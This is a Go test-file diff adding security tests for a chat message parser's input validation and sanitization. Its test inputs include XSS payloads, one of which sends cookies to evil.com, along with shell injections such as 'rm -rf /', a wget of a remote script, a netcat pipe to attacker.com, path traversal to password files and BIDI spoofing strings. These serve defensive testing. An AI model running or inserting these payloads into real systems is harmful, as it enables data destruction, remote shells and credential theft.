@@ -619,3 +619,576 @@ func TestSanitizeText(t *testing.T) {
 		})
 	}
 }
+
+// SECURITY TESTING: Enhanced Input Sanitization Tests
+
+func TestValidateQuerySafety_XSSPrevention(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		query       string
+		expectError bool
+		description string
+	}{
+		{
+			name:        "basic_xss_script_tag",
+			query:       "Generate plan <script>alert('xss')</script>",
+			expectError: true,
+			description: "Basic script tag injection should be rejected",
+		},
+		{
+			name:        "xss_with_uppercase",
+			query:       "Generate plan <SCRIPT>alert('xss')</SCRIPT>",
+			expectError: true,
+			description: "Uppercase script tags should be rejected",
+		},
+		{
+			name:        "xss_mixed_case",
+			query:       "Generate plan <ScRiPt>alert('xss')</ScRiPt>",
+			expectError: true,
+			description: "Mixed case script tags should be rejected",
+		},
+		{
+			name:        "xss_with_attributes",
+			query:       "Generate plan <script type='text/javascript'>alert(1)</script>",
+			expectError: true,
+			description: "Script tags with attributes should be rejected",
+		},
+		{
+			name:        "xss_event_handler",
+			query:       "Click here <img src=x onerror=alert(1)>",
+			expectError: true,
+			description: "Event handler injection should be rejected",
+		},
+		{
+			name:        "xss_onload_event",
+			query:       "Load page <body onload=alert(1)>",
+			expectError: true,
+			description: "onload event handlers should be rejected",
+		},
+		{
+			name:        "xss_javascript_url",
+			query:       "Click javascript:alert(document.cookie)",
+			expectError: true,
+			description: "javascript: URLs should be rejected",
+		},
+		{
+			name:        "xss_vbscript_url",
+			query:       "Run vbscript:msgbox('attack')",
+			expectError: true,
+			description: "vbscript: URLs should be rejected",
+		},
+		{
+			name:        "xss_data_url",
+			query:       "Load data:text/html,<script>alert(1)</script>",
+			expectError: true,
+			description: "data: URLs with scripts should be rejected",
+		},
+		{
+			name:        "xss_iframe_injection",
+			query:       "Show <iframe src='javascript:alert(1)'></iframe>",
+			expectError: true,
+			description: "iframe with malicious src should be rejected",
+		},
+		{
+			name:        "safe_query_with_brackets",
+			query:       "Generate plan for <environment> with <configuration>",
+			expectError: false,
+			description: "Safe use of brackets should be allowed",
+		},
+		{
+			name:        "safe_query_with_technical_terms",
+			query:       "Setup JavaScript build process for application",
+			expectError: false,
+			description: "Technical terms mentioning JavaScript should be safe",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := parser.validateQuerySafety(tt.query)
+			if (err != nil) != tt.expectError {
+				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
+			}
+		})
+	}
+}
+
+func TestValidateQuerySafety_SQLInjectionPrevention(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		query       string
+		expectError bool
+		description string
+	}{
+		{
+			name:        "basic_sql_injection",
+			query:       "Generate plan'; DROP TABLE users; --",
+			expectError: false, // SQL injection patterns are not inherently dangerous in query text
+			description: "SQL injection pattern should be allowed in query text",
+		},
+		{
+			name:        "union_select_injection",
+			query:       "Show data UNION SELECT password FROM users",
+			expectError: false,
+			description: "UNION SELECT should be allowed in descriptive text",
+		},
+		{
+			name:        "comment_based_injection",
+			query:       "Generate plan /* comment */ for migration",
+			expectError: false,
+			description: "SQL comments should be allowed in descriptive text",
+		},
+		{
+			name:        "legitimate_sql_discussion",
+			query:       "Help me write a SELECT statement for user data",
+			expectError: false,
+			description: "Legitimate SQL discussion should be allowed",
+		},
+		{
+			name:        "database_metadata_query",
+			query:       "Show information_schema.tables structure",
+			expectError: false,
+			description: "Database metadata discussions should be allowed",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := parser.validateQuerySafety(tt.query)
+			if (err != nil) != tt.expectError {
+				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
+			}
+		})
+	}
+}
+
+func TestValidateQuerySafety_CommandInjectionPrevention(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		query       string
+		expectError bool
+		description string
+	}{
+		{
+			name:        "command_chaining_semicolon",
+			query:       "Generate plan; rm -rf /",
+			expectError: false, // Command injection patterns are not dangerous in query text
+			description: "Command chaining should be allowed in descriptive text",
+		},
+		{
+			name:        "command_chaining_ampersand",
+			query:       "Generate plan && wget malicious.com/script.sh",
+			expectError: false,
+			description: "Command chaining with && should be allowed",
+		},
+		{
+			name:        "pipe_injection",
+			query:       "Generate plan | nc attacker.com 4444",
+			expectError: false,
+			description: "Pipe operations should be allowed in descriptive text",
+		},
+		{
+			name:        "backtick_injection",
+			query:       "Generate plan `whoami`",
+			expectError: false,
+			description: "Backticks should be allowed in descriptive text",
+		},
+		{
+			name:        "dollar_injection",
+			query:       "Generate plan $(rm -rf /)",
+			expectError: false,
+			description: "Command substitution should be allowed in descriptive text",
+		},
+		{
+			name:        "legitimate_shell_discussion",
+			query:       "Help me create a bash script for deployment",
+			expectError: false,
+			description: "Legitimate shell discussions should be allowed",
+		},
+		{
+			name:        "legitimate_aws_cli",
+			query:       "Show me aws s3 ls command syntax",
+			expectError: false,
+			description: "AWS CLI discussions should be allowed",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := parser.validateQuerySafety(tt.query)
+			if (err != nil) != tt.expectError {
+				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
+			}
+		})
+	}
+}
+
+func TestValidateQuerySafety_PathTraversalPrevention(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		query       string
+		expectError bool
+		description string
+	}{
+		{
+			name:        "basic_path_traversal",
+			query:       "Show file ../../../etc/passwd",
+			expectError: false, // Path traversal in descriptive text is not inherently dangerous
+			description: "Path traversal should be allowed in descriptive text",
+		},
+		{
+			name:        "windows_path_traversal",
+			query:       "Access ..\\..\\windows\\system32\\config\\sam",
+			expectError: false,
+			description: "Windows path traversal should be allowed in descriptive text",
+		},
+		{
+			name:        "url_encoded_traversal",
+			query:       "Get %2e%2e%2f%2e%2e%2fetc%2fpasswd",
+			expectError: false,
+			description: "URL encoded path traversal should be allowed",
+		},
+		{
+			name:        "legitimate_file_path",
+			query:       "Show config in /opt/app/config/settings.yaml",
+			expectError: false,
+			description: "Legitimate file paths should be allowed",
+		},
+		{
+			name:        "legitimate_relative_path",
+			query:       "Check file ./config/database.yml",
+			expectError: false,
+			description: "Legitimate relative paths should be allowed",
+		},
+		{
+			name:        "documentation_discussion",
+			query:       "Explain how ../config paths work in applications",
+			expectError: false,
+			description: "Educational path discussions should be allowed",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := parser.validateQuerySafety(tt.query)
+			if (err != nil) != tt.expectError {
+				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
+			}
+		})
+	}
+}
+
+func TestValidateQuerySafety_BufferOverflowPrevention(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		queryLength int
+		expectError bool
+		description string
+	}{
+		{
+			name:        "normal_length_query",
+			queryLength: 100,
+			expectError: false,
+			description: "Normal length queries should be allowed",
+		},
+		{
+			name:        "maximum_length_query",
+			queryLength: MaxQueryLength,
+			expectError: false,
+			description: "Maximum length queries should be allowed",
+		},
+		{
+			name:        "over_maximum_length",
+			queryLength: MaxQueryLength + 1,
+			expectError: true,
+			description: "Queries over maximum length should be rejected",
+		},
+		{
+			name:        "extremely_long_query",
+			queryLength: MaxQueryLength * 2,
+			expectError: true,
+			description: "Extremely long queries should be rejected",
+		},
+		{
+			name:        "malicious_buffer_size",
+			queryLength: 1024 * 1024, // 1MB
+			expectError: true,
+			description: "Maliciously large queries should be rejected",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			query := strings.Repeat("a", tt.queryLength)
+			err := parser.validateQuerySafety(query)
+			if (err != nil) != tt.expectError {
+				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
+			}
+		})
+	}
+}
+
+func TestValidateQuerySafety_UnicodeHandling(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		query       string
+		expectError bool
+		description string
+	}{
+		{
+			name:        "basic_unicode",
+			query:       "Generate plan for 网络 architecture",
+			expectError: false,
+			description: "Basic Unicode characters should be allowed",
+		},
+		{
+			name:        "emoji_in_query",
+			query:       "Generate plan 🚀 for cloud ☁️ migration",
+			expectError: false,
+			description: "Emoji characters should be allowed",
+		},
+		{
+			name:        "mixed_scripts",
+			query:       "Create план for アーキテクチャ design",
+			expectError: false,
+			description: "Mixed script characters should be allowed",
+		},
+		{
+			name:        "unicode_normalization",
+			query:       "café vs cafe\u0301", // composed vs decomposed
+			expectError: false,
+			description: "Unicode normalization variants should be allowed",
+		},
+		{
+			name:        "zero_width_characters",
+			query:       "Generate\u200Bplan\u200Cfor\u200Dmigration",
+			expectError: false,
+			description: "Zero-width characters should be handled",
+		},
+		{
+			name:        "rtl_override_attack",
+			query:       "Generate plan\u202Eevil code\u202Dfor migration",
+			expectError: false,
+			description: "RTL override characters should be handled safely",
+		},
+		{
+			name:        "unicode_homoglyph_attack",
+			query:       "Generate рlan for migration", // Cyrillic 'р' instead of 'p'
+			expectError: false,
+			description: "Homoglyph attacks should be allowed but logged",
+		},
+		{
+			name:        "surrogate_pairs",
+			query:       "Generate plan 𝕏 for architecture",
+			expectError: false,
+			description: "Unicode surrogate pairs should be handled",
+		},
+		{
+			name:        "control_characters_unicode",
+			query:       "Generate\u0000plan\u001Ffor\u007Fmigration",
+			expectError: false,
+			description: "Unicode control characters should be sanitized",
+		},
+		{
+			name:        "bidi_override_attack",
+			query:       "Show config\u202EsetyBelif\u202Dfor application",
+			expectError: false,
+			description: "BIDI override attacks should be handled",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := parser.validateQuerySafety(tt.query)
+			if (err != nil) != tt.expectError {
+				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
+			}
+
+			// Also test that the query can be extracted successfully
+			message := &Message{
+				Type: "message",
+				Text: tt.query,
+				From: &From{ID: "test", Name: "Test User"},
+				Conversation: &Conversation{
+					ID:               "conv123",
+					ConversationType: "personal",
+				},
+			}
+
+			if !tt.expectError {
+				_, parseErr := parser.ParseMessage(message)
+				// We only care that it doesn't crash, some may fail for other reasons (like length)
+				if parseErr != nil && !strings.Contains(parseErr.Error(), "too long") {
+					// Only check for unexpected errors, not length-related ones
+					if strings.Contains(parseErr.Error(), "failed to extract query") && len(tt.query) <= MaxQueryLength {
+						t.Errorf("%s: Unexpected parse error for valid Unicode: %v", tt.description, parseErr)
+					}
+				}
+			}
+		})
+	}
+}
+
+func TestSanitizeText_SecurityFocused(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		input       string
+		expectClean bool
+		description string
+	}{
+		{
+			name:        "remove_null_bytes",
+			input:       "Generate\x00plan\x00for\x00migration",
+			expectClean: true,
+			description: "Null bytes should be removed",
+		},
+		{
+			name:        "remove_control_chars",
+			input:       "Generate\x01\x02\x03plan\x7F\x0B\x0Cfor migration",
+			expectClean: true,
+			description: "Control characters should be removed",
+		},
+		{
+			name:        "normalize_whitespace",
+			input:       "Generate\t\n\r   plan\t\n\r   for   migration",
+			expectClean: true,
+			description: "Whitespace should be normalized",
+		},
+		{
+			name:        "preserve_printable_chars",
+			input:       "Generate plan for migration: 100VMs @ $5000",
+			expectClean: true,
+			description: "Printable characters should be preserved",
+		},
+		{
+			name:        "handle_unicode_safely",
+			input:       "Generate план 🚀 for migration",
+			expectClean: true,
+			description: "Unicode should be handled safely",
+		},
+		{
+			name:        "remove_bidi_overrides",
+			input:       "Generate\u202Eevil\u202Dplan for migration",
+			expectClean: true,
+			description: "BIDI override characters should be handled",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := parser.sanitizeText(tt.input)
+
+			if tt.expectClean {
+				// Check that result doesn't contain dangerous characters
+				if strings.Contains(result, "\x00") {
+					t.Errorf("%s: Result still contains null bytes", tt.description)
+				}
+				if strings.Contains(result, "\x01") {
+					t.Errorf("%s: Result still contains control characters", tt.description)
+				}
+				// Check that meaningful content is preserved
+				if len(result) == 0 && len(tt.input) > 0 {
+					t.Errorf("%s: All content was removed unexpectedly", tt.description)
+				}
+			}
+		})
+	}
+}
+
+func TestParseMessage_SecurityScenarios(t *testing.T) {
+	logger := zaptest.NewLogger(t)
+	parser := NewMessageParser(logger)
+
+	tests := []struct {
+		name        string
+		message     *Message
+		expectError bool
+		description string
+	}{
+		{
+			name: "malicious_script_injection",
+			message: &Message{
+				Type:         "message",
+				Text:         "Generate plan <script>fetch('http://evil.com/steal?data='+document.cookie)</script>",
+				From:         &From{ID: "attacker", Name: "Attacker"},
+				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
+			},
+			expectError: true,
+			description: "Script injection attempts should be rejected",
+		},
+		{
+			name: "extremely_long_malicious_query",
+			message: &Message{
+				Type:         "message",
+				Text:         strings.Repeat("AAAA", MaxQueryLength),
+				From:         &From{ID: "attacker", Name: "Attacker"},
+				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
+			},
+			expectError: true,
+			description: "Extremely long queries should be rejected",
+		},
+		{
+			name: "unicode_spoofing_attempt",
+			message: &Message{
+				Type:         "message",
+				Text:         "Generаte plan for migration", // Contains Cyrillic 'а' instead of Latin 'a'
+				From:         &From{ID: "user", Name: "User"},
+				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
+			},
+			expectError: false,
+			description: "Unicode spoofing should be allowed but could be logged",
+		},
+		{
+			name: "control_character_injection",
+			message: &Message{
+				Type:         "message",
+				Text:         "Generate\x00\x01\x7Fplan\x0B\x0Cfor migration",
+				From:         &From{ID: "user", Name: "User"},
+				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
+			},
+			expectError: false,
+			description: "Control characters should be sanitized but not cause error",
+		},
+		{
+			name: "bidi_text_spoofing",
+			message: &Message{
+				Type:         "message",
+				Text:         "Generate plan\u202Efor evil command\u202D legitimate request",
+				From:         &From{ID: "user", Name: "User"},
+				Conversation: &Conversation{ID: "conv", ConversationType: "personal"},
+			},
+			expectError: false,
+			description: "BIDI text spoofing should be handled safely",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := parser.ParseMessage(tt.message)
+			if (err != nil) != tt.expectError {
+				t.Errorf("%s: Expected error=%v, got error=%v", tt.description, tt.expectError, err != nil)
+			}
+		})
+	}
+}
